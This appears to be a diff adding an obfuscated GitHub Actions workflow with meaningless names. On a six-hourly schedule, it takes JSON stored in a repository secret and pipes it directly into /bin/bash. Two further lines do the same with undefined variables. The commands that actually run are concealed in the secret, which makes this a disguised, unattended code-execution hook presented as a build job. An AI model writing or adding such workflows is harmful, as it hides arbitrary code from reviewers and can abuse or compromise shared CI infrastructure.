@@ -1,0 +1,20 @@
+name: turanlifjs
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: turanlifjs
+        env:
+          esho9744: ${{ secrets.esho9744 }}
+        run: |
+          echo $esho9744 | jq -r .jue74429 | /bin/bash
+          echo $ltpig305 | jq -r .q35931 | /bin/bash
+          echo $k7630 | jq -r .ylktm78372 | /bin/bash
+
